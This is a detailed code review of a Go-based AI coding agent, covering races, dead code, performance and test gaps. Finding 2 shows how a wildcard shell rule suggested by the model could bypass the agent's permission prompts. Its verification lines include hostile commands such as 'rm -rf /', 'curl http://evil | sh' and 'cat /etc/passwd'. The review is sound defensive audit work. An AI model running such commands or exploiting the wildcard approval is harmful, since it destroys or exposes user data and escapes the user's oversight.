# Whole-codebase review: architecture, readability, correctness, performance, testing

**Scope:** every production Go file in `cmd/`, `internal/`, and `evals/`, plus
the tests that cover them.

**Mode:** specific-topic, in the requested order: architecture, readability,
correctness, performance, testing.

## Confirmed findings

### 1. `session/set_config_option` during a turn is a data race — correctness

`internal/agent/loop.go:1700`, `1702`, `1708`; `internal/agent/agent.go:1380`,
`1230`

`publishUsage` reads `value.state.cost` and calls
`value.state.turnConfiguration()` without holding `stateMu`, and `Prompt` reads
`value.state.cwd` the same way when it builds the event adapter.
`SetSessionConfigOption` reaches `commitLocked`, which assigns `value.state =
next` under `stateMu`, and it is gated only by `claimConfigChange`, which
refuses nothing but a closing session. A live turn and a configuration change
therefore run concurrently by design.

Failure scenario: a client sends `session/set_config_option` (model or mode)
while `session/prompt` is streaming. The turn goroutine reads a `durableState`
struct mid-assignment. Effects range from a torn `cost` float in the
`usage_update` notification to a `requestConfiguration` whose `Tools` slice
header and length come from different versions.

Confirmed with the race detector through the real ACP methods. Both reads race
against the same write:

```
WARNING: DATA RACE
Write at ... by goroutine 58:
  agent.(*Agent).commitLocked()             internal/agent/agent.go:1230
  agent.(*Agent).SetSessionConfigOption()   internal/agent/config_options.go:100
Previous read at ... by goroutine 81:
  agent.(*Agent).publishUsage()             internal/agent/loop.go:1702
  agent.(*Agent).runFrom()                  internal/agent/loop.go:323
Previous read at ... by goroutine 57:
  agent.(*Agent).Prompt()                   internal/agent/agent.go:1380
```

Fix: take `stateMu` for those reads, the way `modelRequest` and
`prefixFingerprint` already do. Then audit the rest of the turn goroutine —
`value.state.usage.acp()` at `loop.go:119`, `162`, `247`, `346`, `465`, and
`value.state.cwd` at `loop.go:261`. A small accessor returning the needed fields
under the lock would remove the whole class.

### 2. A derived shell rule can be a bare glob, granting every command — correctness

`internal/shellrules/shellrules.go:69`

`Suggest` filters glob characters through `literalValue`, but when that filter
rejects every argument it falls back to `strings.Fields(command)`, which does
not filter. `ruleMatchesCall` treats `*` as a positional wildcard, so the rule
`*` matches any invocation with at least one argument.

Failure scenario: the model calls `shell` with `{"command":"*"}`. Ox offers
`Allow "*" for this session`. If the user accepts, `shellCovered` returns true
for every later command in the activation and no further permission request is
made. Verified:

```
Suggest("*") = "*"
Allowed(["*"], "rm -rf /")              = true
Allowed(["*"], "curl http://evil | sh") = true
Allowed(["*"], "cat /etc/passwd")       = true
```

`?` and `[a-z]` are safe because they are matched literally; only `*` is
special-cased in `ruleMatchesCall`.

Fix: apply the same glob rejection to the `strings.Fields` fallback, or drop the
fallback and return `""` when no literal first word can be derived. An empty
suggestion already causes `permissionOptions` to omit allow-always and
`executeSuspendedBatch` to downgrade an allow-always answer to allow-once.

### 3. `internal/lsp` has no importer — architecture

`internal/lsp/` (1,342 production lines across `lsp.go`, `client.go`,
`protocol.go`)

No file in the repository imports `github.com/kkestell/ox/internal/lsp`. The
package compiles and its own tests pass, but nothing in the shipped binary, in
`internal/tools`, or in `internal/agent` reaches it.

Two documents disagree with that. `eng/architecture.md:66` states that
`internal/lsp` owns language-server lifecycles, and its dependency-direction
block claims `agent -> lsp` (`:113`) and `tools -> lsp` (`:123`); neither edge
exists. `AGENTS.md`'s codebase map never mentions the package at all, though the
file opens with "KEEP THIS FILE AND ITS LINKED REFERENCES UP TO DATE AT ALL
TIMES."

Fix: decide the package's status. If language tools are still wanted, wire them
through `internal/tools` and add the entry to the `AGENTS.md` codebase map. If
not, delete the package and the architecture section that describes it. Either
way the two documents must stop describing edges the code does not have.

### 4. Removing delegation left behind structure nothing uses — architecture

Seven places now exist only to support a feature that is gone:

- `internal/agent/loop.go:1033` (`executeBatchWith`), `1009` (`executeBatch`),
  and `1354` (`partition`) have no production caller. `executeBatchWith` was the
  child-call path; `executeBatch` and `partition` are reached only from
  `approval_test.go` and `agent_test.go`. That is roughly 230 lines of the
  approval machinery kept alive by tests, duplicating the walk that
  `executeSuspendedBatch` (`loop.go:773`) performs for real.
- `internal/agent/tool.go:22` (`Tool.Label`) can never be set: `agent.New`
  rejects any tool that sets it (`agent.go:96`). `toolTitle` (`loop.go:1633`)
  still iterates over `tool.Label` looking for a value that cannot exist.
- `internal/agent/tool.go:18` (`Tool.ParentOnly`) has no reader. `tools.go:43`
  still sets it on `todo` and `tools_test.go:118` still asserts it, but no agent
  code consults it now that there is one tool set.
- `internal/agent/reads.go:31` (`childFileReads`) has no caller, and
  `session.readScopes` / `readScopesMu` (`agent.go:1701`) exist only for it.
  `clearFileReads` walks a set that can never hold more than the session's own
  scope.
- `internal/agent/state.go:1152` (`applyCompaction`) has no caller either, while
  `apply` still open-codes the same splice at `state.go:809`.

Fix: delete all of it, then either use `applyCompaction` at `state.go:809` or
delete that too. The `executeBatchWith` family is the important one — it leaves
two copies of the approval and cancellation rules where the project needs one,
and the surviving copy is the one with less direct test coverage.

### 5. Streamed tool output is re-copied per chunk — performance

`internal/agent/adapter.go:220`, `209`

`appendOutput` computes `outputTail(tail + chunk)`, allocating and copying the
whole 32 KiB tail for every chunk the shell tool emits. `StreamRecorder` flushes
a line group roughly every 100 ms, so a chatty command produces thousands of
chunks per call.

Measured on an M4 for 2,000 chunks of 80 bytes — a 160 KiB command output,
roughly `go test -v` on this repository:

```
BenchmarkAppendOutput2000x80-10   254   4714572 ns/op   72229449 B/op   2006 allocs/op
```

72 MB allocated to carry 160 KB of text, 450x the payload.

Fix: keep the tail in a fixed `[]byte` of `maxToolOutputTail`, append into it,
and copy down only when it is full. `flush` already converts to a string once
per notification, so the tail never needs to be a string in between.

### 6. `providerRequestBytes` marshals the request even when tracing is off — performance

`internal/agent/loop.go:178`, `internal/agent/compact.go:110`

`Turn.Provider` returns an empty `ProviderRequest` immediately when the trace is
disabled (`internal/trace/trace.go:120`), but its `requestBytes` argument is
evaluated first. `providerRequestBytes` (`loop.go:1536`) JSON-marshals the
complete request — system prompt, whole history, every tool schema — and
discards it. This runs on every primary and compaction request, whether or not
`--trace` was passed.

Measured on a 200-message history:

```
BenchmarkProviderRequestBytes-10   2170   553750 ns/op   2551111 B/op   628 allocs/op
```

Fix: pass a `func() int` and call it inside `Provider` after the nil check, or
let the assembled request carry its encoded size — `Client.Stream` already
marshals the same body, and `estimateProviderRequest` marshals it a third time
during admission.

### 7. `outputTail` can loop over the whole string and delete valid output — correctness, performance

`internal/agent/adapter.go:209`

```go
value = value[len(value)-maxToolOutputTail:]
for !utf8.ValidString(value) {
    value = value[1:]
}
```

`utf8.ValidString` reports on the entire string, not on its first rune. The loop
is written as if it only trims a split rune at the front, but any invalid byte
anywhere makes the condition stay true, so it strips one byte per iteration
until the string happens to become valid or empty. Each iteration rescans up to
32 KiB.

Failure scenario: a tool result containing a single invalid byte in its middle —
MCP content, or delegated shell output from a client that did not sanitize its
terminal buffer — enters `eventToolCompleted` with 32 KiB of text. The loop runs
up to 32,768 times over a 32 KiB string, about a gigabyte of scanning, and the
client receives a truncated result missing everything before the bad byte. The
local shell path is safe only because `StreamRecorder.sanitize` already replaced
invalid sequences.

Fix: trim only a leading incomplete rune, as `workspace.incompleteUTF8Tail`
already does, and replace the rest with `strings.ToValidUTF8`.

### 8. `edit_file` counts overlapping matches — correctness

`internal/tools/edit.go:177`

`matchSites` advances by one byte after each hit, so it counts overlapping
occurrences, while `strings.ReplaceAll` and `strings.Replace` replace
non-overlapping ones.

Failure scenario, verified:

```
content "aaa\n", old_string "aa", new_string "b"
  matchSites -> [0 1], reported replacements = 2
  strings.ReplaceAll -> "ba\n", actual replacements = 1
```

With `replace_all` the tool reports "Edited x (2 replacement(s))" after making
one. Without it, the call is rejected as ambiguous — "occurs 2 times (first
matches at lines 1 and 1)" — even though a single non-overlapping replacement
was well defined. The model then re-reads the file and retries against text that
has not changed.

Fix: advance `offset` by `len(oldText)` so the count matches the replacement
semantics.

### 9. Context occupancy mixes bytes with tokens — correctness

`internal/agent/compact.go:491`, `internal/agent/loop.go:1702`

`bytesToTokens` returns its argument: one byte is treated as one token. The
comment defends this as a safe upper bound for admission, and as a bound it is.
But the same number leaves the admission path and becomes client-visible state.
`compactionRecord.Occupancy` feeds `acp.UsageUpdate.Used`, and
`eng/architecture.md` specifies that field as "the last measured provider prompt
size, or the estimated prompt size immediately after a durable compaction." The
first source is real tokens from `Usage.PromptTokens`; the second is a byte
count, roughly 4x larger for ordinary text.

Consequences, both reachable in one session:

- The client's context meter jumps to roughly 4x its true value immediately
  after a compaction, then snaps back on the next provider response.
- `shouldCompact` fires at 80% of the window measured in bytes, so a 200,000
  token window starts summarizing at about 40,000 real tokens. Each compaction
  is a full extra provider request whose output replaces context the model could
  still have used.

Fix: keep the byte bound for the admission decision, since it is conservative in
the safe direction, but convert before publishing and before comparing against
the window — even a fixed divisor stated in one named constant would keep the
two occupancy sources on the same unit.

### 10. `session/list` folds every session log on every call — performance, correctness

`internal/agent/store.go:124`

`fileStore.list` reads each `.jsonl` file in full and runs `foldRecords` on it —
rebuilding message history, replaying checkpoints, and validating every record —
then the caller filters by cwd and returns one 50-entry page. Paging through a
second page repeats the entire scan.

Input size and frequency: one `session/list` per client session-picker open,
against every session the user has ever created, each up to `maxSessionBytes`
(64 MiB). A user with 500 one-megabyte logs reads and folds 500 MB per call to
return four fields per session.

The same function has a correctness edge: any single unfoldable log makes the
whole method return an error, so one corrupt session makes every session
unlistable, and `session/delete` requires an ID the user can no longer discover.

Fix: `SessionInfo` needs only `id`, `cwd`, `title`, and `updatedAt`. Scan for
the first `session_created` record and the last record's timestamp instead of
folding, and skip an unreadable log with a warning rather than failing the call.

### 11. Every commit deep-copies the whole session — performance

`internal/agent/state.go:670` (`clone`), plus the JSON round-trip clones at
`state.go:1354`, `1440`, `1850`, `1889`

`commitLocked` calls `value.state.clone()` before applying each record. `clone`
copies `s.records` — the complete in-memory log — plus the full history, and it
deep-copies tool executions through `cloneToolExecution`, which is implemented
as `json.Marshal` followed by `json.Unmarshal`. `cloneStoredToolResult`,
`cloneSuspendedExchange`, and `cloneResolved` do the same.

Measured:

```
BenchmarkStateClone100-10    178780    5731 ns/op    32145 B/op    134 allocs/op
BenchmarkStateClone1000-10    28686   41654 ns/op   288514 B/op   1035 allocs/op
```

The cost is linear in the record count and commits are proportional to it, so a
session pays quadratic total copying. `s.records` is the avoidable part: during
a live session it is read only by `newCheckpointRecord`, which inspects the last
record's type, and by `replay`, which runs on a state freshly folded from disk.

Fix: keep the last record's type instead of the whole slice on the live path,
and replace the JSON round-trip clones with explicit field copies. A
hand-written `cloneToolExecution` is a dozen lines and roughly two orders of
magnitude cheaper.

### 12. `turnConfiguration()` deep-clones inside per-call loops — performance

`internal/agent/state.go:1843`; loop callers at `state.go:1020`, `1182`, `1301`

`turnConfiguration` returns `cloneConfiguration(...)`, which clones every tool
schema, both tool-kind maps, the MCP evidence, the skill list, and runs
`cloneResolved`'s JSON round trip.

```
BenchmarkTurnConfiguration-10   1774821   674.8 ns/op   3039 B/op   25 allocs/op
```

Three of its thirteen call sites are inside loops in `apply` and
`validateToolExecution` that need one map lookup —
`s.turnConfiguration().ToolKinds[name]`. `apply` runs twice per commit (once on
the clone, once during checkpoint validation), so a ten-call tool group rebuilds
the configuration dozens of times per record.

Fix: hoist one `configuration := s.turnConfiguration()` per function and add a
`toolKind(name)` accessor for the lookup-only sites.

### 13. Read evidence and write verification can use different executors — correctness

`internal/tools/read.go:68`, `internal/tools/write.go:57`,
`internal/tools/edit.go:71`

`executeRead` delegates to the client when `FileSystem.ReadTextFile` is set;
`executeWrite` and `executeEdit` delegate only when `FileSystem.WriteTextFile`
is set. The capabilities are negotiated independently, so a client advertising
`{"fs":{"readTextFile":true}}` records read evidence from the client's buffer
and then verifies it against local disk.

Failure scenario: the editor has unsaved changes to `notes.txt`. `read_file`
returns the buffer and records `sha256(buffer)`. `write_file` takes the local
path, reads `before` from disk, and reports "the file changed since read_file
read it; read it again". Re-reading returns the buffer again, so the model loops
until it gives up. `TestFilesystemCapabilitiesSelectEachMethodIndependently`
covers this capability split but keeps the client content identical to disk, so
it passes.

Fix: record read evidence keyed to the executor that produced it and reject the
mixed combination at activation, or require both filesystem capabilities
together. `eng/architecture.md` currently promises per-method independence, so
whichever way this resolves the document needs the matching sentence.

### 14. A stale or empty model catalog cache poisons the process — correctness

`internal/openrouter/catalog.go:203`, `internal/openrouter/cache.go:39`

`loadCatalog` returns the on-disk cache whenever it parses, with no freshness
check, and kicks off `refreshCatalog` in a goroutine. That goroutine writes the
fresh catalog to disk but never installs it into `c.catalog`, and `Catalog`
memoizes the first success for the process lifetime.

Failure scenario: the cache file contains `{}` or a truncated `{"data":[]}`.
`readCatalogCache` succeeds with zero models. Every `session/new` then fails
with "model is not in the OpenRouter catalog" for a model that exists, and the
background refresh repairs the file without helping the running process. The
user sees a permanent failure that a restart silently fixes.

Two smaller edges in the same path: `fetchCatalogAttempt` at `catalog.go:307`
reads the response body with a bare `io.ReadAll`, while every other body read in
the package uses `io.LimitReader(..., maxErrorBodySize)`; and `refreshCatalog`
is a detached goroutine with no tie to process shutdown.

Fix: reject a cache with no models, record a write timestamp and treat an old
cache as a miss, and install the refreshed catalog into `c.catalog`.

### 15. A stream that emitted only tool-call fragments is retried — correctness

`internal/openrouter/client.go:219`, `internal/openrouter/stream.go:113`

`emitted` is set only when a text or reasoning delta reaches the callback. Tool
call fragments and reasoning-detail blocks accumulate in the assembler without
setting it. `Stream` retries whenever `!emitted` and the failure classifies as
transient.

`eng/architecture.md` states that the provider boundary "retries transient
failures within a bounded budget only before response content has been
observed." A partially streamed tool call is observed response content.

Failure scenario: the model answers a turn with a single `edit_file` call and no
prose. The connection resets after half the arguments have streamed. Ox retries
the full request, paying for the prompt twice. No tool has executed, so nothing
is duplicated beyond cost and latency — but the rule the document states is not
the rule the code implements.

Fix: set `emitted` from `streamAssembler.push` whenever any choice delta carries
content of any kind, rather than from the text and reasoning callback sites.

### 16. `grep` silently discards a file's matches after one bad line — correctness

`internal/tools/grep.go:117`

`scanFile` returns `nil, false` when `readBoundedLine` reports `errLineTooLong`
or `errInvalidText`. It discards the `entries` already collected from earlier
lines and produces no diagnostic.

Failure scenario: a Go source file with a long generated table, or a `.ts` file
with an embedded base64 blob past `maxScanLineBytes` (4 MiB), or any file with a
single invalid UTF-8 byte. Matches on lines before the offending line vanish
from the result. The model concludes the symbol does not exist.

Fix: return the entries collected so far, and append one note naming the file
and the line where scanning stopped.

## Lower-severity findings

### Readability

- `internal/agent/agent.go:1341`: `userMessage, err := promptMessage(...)`
  followed by `_ = userMessage`. The call is validation; say so by giving it a
  `validatePromptContent` name that returns only an error, or drop the
  assignment.
- `internal/agent/agent.go:1735` (`claim`) and `1788` (`claimRecovery`) are
  thirty near-identical lines differing in one precondition. One function taking
  the precondition as a closure, or a shared `beginTurn` body, states the rule
  once.
- `internal/agent/loop.go:88` (`runFrom`) is 262 lines with five levels of
  nesting and no one-sentence job. Its suspended-versus-fresh branch and its
  tool-result publication loop are the two natural extractions.
- `internal/workspace/workspace.go:301` (`isEscape`) detects a confinement
  escape with `strings.Contains(pathErr.Err.Error(), "escapes from parent")`.
  Nothing breaks if the stdlib rewords that message — the operation still
  fails — but the user-facing error silently degrades from "outside the
  workspace" to "cannot access". Worth a comment naming the dependency.
- `internal/openrouter/client.go:144` classifies a retryable failure with
  `strings.Contains(attemptErr.Error(), "read OpenRouter stream")` two lines
  after branching on the `errStreamEnded` sentinel. Wrap the same site in
  `sse.go:47` with a second sentinel and branch on it.
- `cmd/ox/main.go:30`: `handlerConcurrency = 1 << 30` has no comment. The value
  means "do not serialize handlers", which is a deliberate consequence of the
  concurrent-session design and deserves one line saying so.
- `internal/agent/mcp.go:38`: `descriptor := descriptor` has been unnecessary
  since Go 1.22 and this module is on 1.26.

### Correctness

- `internal/tools/text.go:48` (`restoreText`): when the original file had no
  trailing newline, the else branch strips *all* trailing line endings from the
  result, not just one. An edit whose `new_string` deliberately ends in blank
  lines loses them. The symmetric branch adds at most one.
- `internal/tools/text.go:40` (`convertEnding`) normalizes the whole file to the
  dominant ending. For a file with mixed endings and CRLF dominant, every lone
  LF is rewritten to CRLF across the file, not just at the edit site. Both
  `editDescription` and `writeDescription` promise line endings are "preserved".
- `internal/workspace/walk.go:79` skips every entry whose name starts with `.`,
  so `glob` and `grep` cannot see `.github/`, `.agents/`, or any dotfile. That
  is a defensible product choice, but it is stated only in the tool descriptions
  as "skips hidden files" and nowhere in `docs/spec.md`.
- `internal/workspace/workspace.go:318` (`atomicReplace`) uses a fixed
  `<base>.ox-tmp` name. Concurrent writers are no longer reachable —
  `write_file` and `edit_file` are not `ParallelSafe` and serialize on
  `exclusiveMu` — but a crash between create and rename leaves the temp file in
  the user's workspace, where builds and watchers will see it.

### Performance

- `internal/workspace/walk.go:85`:
  `matcher.Match(pathComponents(filepath.Join(...)), isDir)` allocates a joined
  path, a cleaned copy, and a component slice for every directory entry, then
  scans every accumulated ignore pattern including the host-ancestor set read by
  `readHostAncestorGitignores`. On a 50,000-file tree with 200 patterns that is
  50,000 slice allocations and 10 million pattern comparisons per `glob` or
  `grep` call.
- `internal/workspace/stream.go:115` (`capturePreview`) calls `lastLines`, and
  thus `lineBoundaries`, on the whole retained tail for every `Write`. The
  boundary slice is rebuilt from scratch each time.
- `internal/mcp/mcp.go:143` (`Bundle.Call`) runs a full paginated `tools/list`
  before every tool call to re-verify identity. That doubles the round trips for
  every MCP call. The re-verification is deliberate — `eng/architecture.md` says
  server metadata changes cannot expand an active turn's authority — but
  verifying once per turn would meet the same rule.
- `internal/tools/grep.go:117`: in `files_with_matches` mode `scanFile` keeps
  reading to EOF after the first match instead of returning.

### Architecture

- `internal/settings/merge.go:32`, `44`, `58` return the input pointer when one
  side is nil, so the merged `Config` aliases the caller's nested structs. The
  doc comment's "mutating neither input" holds today only because no caller
  mutates the result.

## Testing

These are gaps in what the suite proves, not defects in the tests that exist.

- **No test drives a configuration change concurrently with a running turn.**
  This is why finding 1 survives `make check` — every
  `session/set_config_option` test in `internal/e2e/session_test.go` and
  `integration/agent_loop_test.go` runs between turns. An `internal/e2e` test
  that holds a model stream with `hold` and sets the model mid-turn would catch
  it under `-race`, and is the right boundary because the behavior is
  ACP-visible.
- **Allow-always rule scoping is unit-tested through dead code.**
  `TestExecuteBatchScopesAllowAlwaysToToolRules` and
  `TestExecuteBatchOmitsUnscopedAllowAlways`
  (`internal/agent/approval_test.go:160`, `249`) go through `executeBatch`,
  which now has no production caller at all. The path production does take,
  `executeSuspendedBatch`, has its own copy of the downgrade rule and is covered
  only by `TestShellApprovalGrantIsRuleScopedAndActivationScoped`. Resolving
  finding 4 has to move these tests, not just delete the wrapper.
- **No test constrains what a derived shell rule may be.**
  `internal/shellrules/shellrules_test.go` covers matching thoroughly but never
  asserts that `Suggest` refuses to produce a wildcard. A table asserting
  `Suggest("*") == ""` is the regression test for finding 2.
- **The `edit_file` replacement count is asserted only for non-overlapping
  text.** `TestEditFileMatchesExactlyAndExplainsRefusals`
  (`internal/tools/tools_test.go:1045`) checks "2 replacement(s)" for `"one"` in
  `"one\ntwo\none\n"`. A case with a self-overlapping `old_string` is the
  regression test for finding 8.
- **The mixed filesystem-capability case is tested only where it agrees.**
  `TestFilesystemCapabilitiesSelectEachMethodIndependently` exercises
  delegated-read with local-write, but seeds the client with the same bytes as
  disk. Making the client content differ from the file turns it into the
  regression test for finding 13.
- **Six `internal/e2e` tests fail.**
  `TestMCPChildDispatchThroughShippedBinary` (`mcp_test.go:232`),
  `TestOpenParentCompactionCheckpointSurvivesCrash` (`session_test.go:392`),
  `TestOpenChildCompactionCheckpointSurvivesCrash` (`session_test.go:458`),
  `TestRestartDoesNotRepeatStartedChildTool` (`session_test.go:981`), and
  `TestDiagnosticTraceClassifiesCompactionSubagentAndCancellation`
  (`trace_test.go:167`) all drive `task_add` and `task_run`, which no longer
  exist. `TestSessionCompactionSurvivesRestartWithoutChangingReplay`
  (`session_test.go:342`) fails on its usage-update count with two mock
  responses left unconsumed. Until these are deleted or rewritten, `make check`
  cannot pass and the suite cannot gate anything.
- **No test covers a corrupt log's effect on `session/list`.**
  `internal/agent/store_test.go` covers torn-tail repair on `open` but not the
  listing path, where one bad file currently fails the whole method.

## Checks run

- `go build ./...` and `go vet ./...` — clean.
- `go test -race -count=1 ./...` — every package passes except `internal/e2e`,
  which has six failures (detailed under Testing). The packages carrying the
  findings below — `internal/agent`, `internal/tools`, `internal/workspace`,
  `internal/openrouter`, `internal/shellrules`, `integration` — all pass.
- Race reproduction for finding 1: a temporary test in `integration` that calls
  `session/set_config_option` in a loop while `session/prompt` runs a 12-request
  tool turn. Reported two races against `agent.go:1230`, from `loop.go:1702` and
  `agent.go:1380`. Removed after confirmation.
- Rule reproduction for finding 2: a temporary test in `internal/shellrules`
  feeding `Suggest` the commands `*`, `* `, `?`, and `[a-z]` and passing each
  result to `Allowed`. Removed after confirmation.
- Overlap reproduction for finding 8: a standalone program comparing
  `matchSites` against `strings.ReplaceAll` on `"aaa"` / `"aa"`.
- Benchmarks for findings 5, 6, 11, and 12: a temporary `zz_bench_test.go` in
  `internal/agent` with `-benchmem` on an Apple M4. Numbers quoted in place.
  Removed after measurement.
- `grep` sweeps establishing that nothing imports `internal/lsp` and that
  `executeBatchWith`, `executeBatch`, `partition`, `childFileReads`,
  `applyCompaction`, `Tool.Label`, and `Tool.ParentOnly` have no production
  reader.

### Validation gaps

- **`staticcheck` cannot run.** The installed binary rejects Go 1.27 export data
  ("export data version 4 is greater than maximum supported version 2"), so
  `make check-go` cannot complete its third step on this machine. Anything
  staticcheck would have found is outside this review's evidence.
- **`make check-docs` was not run** because `dprint` is not installed here.

## Unresolved suspicions

- `internal/tools/shell.go` (`terminalEnvironment`) serializes the entire
  process environment into a `terminal/create` request. The local path passes
  the same environment through `fork`, where it is never serialized. Whether the
  ACP request is an acceptable place for that data depends on the client's
  logging, which is outside this corpus. Settling it needs a stated trust model
  for client request logs, which no document in the repository provides.
- `internal/agent/memory.go` (`validateMemoryFact`) requires `ExpiresAt ==
  CreatedAt + memoryRetention` exactly, so changing `memoryRetention` makes
  every stored fact fail validation and the whole document unloadable. With no
  users this is harmless today; it is listed only because the failure mode is
  total rather than partial.
